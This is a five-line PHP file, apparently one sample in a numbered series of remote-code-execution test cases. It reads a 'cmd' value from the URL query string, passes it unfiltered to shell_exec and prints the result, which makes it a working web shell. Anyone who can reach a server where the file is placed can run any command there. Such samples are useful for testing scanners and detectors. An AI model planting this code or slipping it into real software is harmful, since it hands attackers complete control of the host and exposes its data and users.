<?php
// RCE test variation #959
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>